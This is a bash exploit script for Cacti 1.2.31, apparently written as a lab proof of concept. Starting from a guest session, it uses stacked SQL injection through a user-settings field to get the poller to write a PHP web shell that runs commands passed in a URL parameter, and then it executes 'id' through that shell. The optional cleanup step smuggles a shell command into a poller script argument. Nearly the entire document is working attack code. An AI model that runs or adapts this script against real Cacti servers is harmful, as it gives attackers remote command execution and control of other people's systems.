#!/bin/bash
# 4http2shell — Cacti 1.2.31 guest -> root PHP web shell.
# CLEANUP=1 restores the poller row and removes the shell.
set -u
C=${C:-http://127.0.0.1:8096/cacti}
J=${J:-/tmp/4http2shell-shell.jar}
SHELL_PATH=${SHELL_PATH:-/srv/cacti-lpe/4http-shell.php}
WEB_PATH=${WEB_PATH:-$C/4http-shell.php}
CLEANUP=${CLEANUP:-0}
rm -f "$J" "$SHELL_PATH"

PHP='<?php echo "4HTTP-SHELL\n"; if(isset($_GET["c"])){system($_GET["c"]);} ?>'
B64=$(printf '%s' "$PHP" | base64 -w0)
CMD="echo $B64 | base64 -d > $SHELL_PATH; chmod 644 $SHELL_PATH"
HEX=$(CMD="$CMD" python3 -c 'import os; print(os.environ["CMD"].encode().hex())')
[ -n "$HEX" ] || { echo "hex encode failed"; exit 1; }

echo "[1] guest session"
curl -sS -c "$J" -b "$J" "$C/auth_profile.php?tab=general&header=false" -o /tmp/4http_shell_guest.html \
  -w "    auth_profile %{http_code} (%{size_download}b)\n"
TOK=$(grep -o "csrfMagicToken='[^']*'" /tmp/4http_shell_guest.html | head -1 | cut -d"'" -f2)
[ -n "$TOK" ] || { echo "no guest csrf token"; exit 1; }

PAY="1;UPDATE poller_item SET host_id=1,action=1,arg1=0x$HEX WHERE local_data_id=1;-- "
echo "[2] stage PHP-shell write via guest stacked SQLi"
curl -sS -b "$J" -c "$J" -o /dev/null -w "    update_data %{http_code}\n" \
  --data-urlencode "__csrf_magic=$TOK" \
  --data-urlencode 'name=preview_graphs_per_page' \
  --data-urlencode "value=$PAY" \
  "$C/auth_profile.php?tab=general&action=update_data&header=false"

echo "[3] execute stacked SQL"
curl -sS -b "$J" -c "$J" -o /dev/null -w "    preview %{http_code} (%{size_download}b)\n" \
  "$C/graph_view.php?action=preview&page=1&clear=1"

echo "[4] trigger realtime poller as guest"
curl -sS -b "$J" -c "$J" -o /tmp/4http_shell_realtime.json -w "    realtime %{http_code} (%{size_download}b)\n" \
  "$C/graph_realtime.php?action=init&local_graph_id=1&ds_step=10&size=90"

echo "[+] shell file"
ls -la "$SHELL_PATH" 2>&1
echo "[+] shell command"
curl -sS "$WEB_PATH?c=id"
echo
if [ "$CLEANUP" = "1" ]; then
  BASE="perl /tmp/cacti-1.2.31/scripts/webhits.pl 'x; id > /tmp/cacti-pwn-id; #'"
  B1=$(BASE="$BASE" python3 -c 'import os; print(os.environ["BASE"].encode().hex())')
  CLEAN="1;UPDATE poller_item SET host_id=0,action=1,arg1=0x$B1 WHERE local_data_id=1;DELETE FROM settings_user WHERE name='preview_graphs_per_page';-- "
  curl -sS -b "$J" -c "$J" -o /dev/null -w "    cleanup post %{http_code}\n" \
    --data-urlencode "__csrf_magic=$TOK" --data-urlencode 'name=preview_graphs_per_page' --data-urlencode "value=$CLEAN" \
    "$C/auth_profile.php?tab=general&action=update_data&header=false"
  curl -sS -b "$J" -c "$J" -o /dev/null -w "    cleanup preview %{http_code}\n" \
    "$C/graph_view.php?action=preview&page=1&clear=1"
  rm -f "$SHELL_PATH"
  echo "[+] cleanup complete"
else
  echo "[+] shell kept. Re-run with CLEANUP=1 to restore the lab."
fi
